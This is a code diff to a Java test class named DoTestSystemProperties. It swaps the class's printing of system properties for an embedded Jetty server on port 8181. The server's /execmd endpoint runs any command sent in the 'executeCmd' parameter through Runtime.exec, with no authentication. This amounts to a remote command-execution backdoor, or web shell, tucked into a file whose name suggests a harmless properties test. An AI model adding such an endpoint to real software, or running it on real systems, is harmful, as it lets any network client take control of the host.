@@ -20,19 +20,46 @@
 
 package com.creditease.uav.base.test;
 
+import java.io.IOException;
 import java.util.Properties;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+import org.eclipse.jetty.server.Request;
+import org.eclipse.jetty.server.Server;
+import org.eclipse.jetty.server.handler.AbstractHandler;
 
 public class DoTestSystemProperties {
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
 
-        Properties p = System.getProperties();
+        Server server = new Server(8181);
+        server.setHandler(new AbstractHandler() {
 
-        for (Object k : p.keySet()) {
+            @Override
+            public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
+                System.out.println("target:"+target);
+                if("/execmd".equals(target)||("/execmd/").equals(target)){
+                    response.setContentType("text/html;charset=utf-8");
+                    request.setCharacterEncoding("UTF-8");
+                    response.setStatus(HttpServletResponse.SC_OK);
+                    String command= request.getParameter("executeCmd");
+                    baseRequest.setHandled(true);
+                    if(command!=null){
+                        Process p= Runtime.getRuntime().exec(command);
+                        response.getWriter().println("OK");
+                    }else {
+                        response.getWriter().println("null");
+                    }
 
-            System.out.println(k + "=" + p.getProperty((String) k));
 
-        }
+                }
+
+            }
+        });
+        server.start();
     }
 
 }
